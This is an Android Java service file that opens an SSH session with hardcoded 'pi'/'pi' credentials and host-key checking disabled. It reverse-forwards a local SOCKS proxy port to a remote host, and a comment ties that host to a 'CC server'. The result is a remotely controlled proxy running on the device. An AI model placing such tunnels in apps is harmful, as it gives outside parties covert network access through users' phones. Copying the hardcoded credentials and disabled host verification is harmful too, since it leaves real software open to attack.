package com.kassel;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;

public class ReverseTunnelIntentService extends IntentService {
    public ReverseTunnelIntentService() {
        super("ReverseTunnelIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        try {
            JSch jsch = new JSch();

            String userName = "pi";
            String password = "pi";
            String host = "192.168.50.233";
            int port = 22;

            int remotePort = 8887; // this should be queried from CC server
            int localPort = 9999; // this is the port our SOCKS server is running
            String localhost = "localhost";

            Session session = jsch.getSession(userName, host, port);
            session.setPassword(password);
            session.setConfig("StrictHostKeyChecking", "no");

            /*
            session.setConfig("cipher.s2c", "none");
            session.setConfig("cipher.c2s", "none");

            session.setConfig("cipher.s2c", "aes128-cbc,3des-cbc,blowfish-cbc");
            session.setConfig("cipher.c2s", "aes128-cbc,3des-cbc,blowfish-cbc");*/
            session.setConfig("CheckCiphers", "3des-cbc");//,aes128-cbc,aes192-cbc,aes256-cbc,aes128-ctr,aes192-ctr,aes256-ctr,3des-ctr,arcfour,arcfour128,arcfour256");

            session.setConfig("PreferredAuthentications", "password");

            session.connect();

            session.setPortForwardingR(remotePort, localhost, localPort);

            // SOCKS server now available @ host:remoteport
        } catch (Exception e) {
            Log.e("Exception", e.getMessage());
        }
    }
}
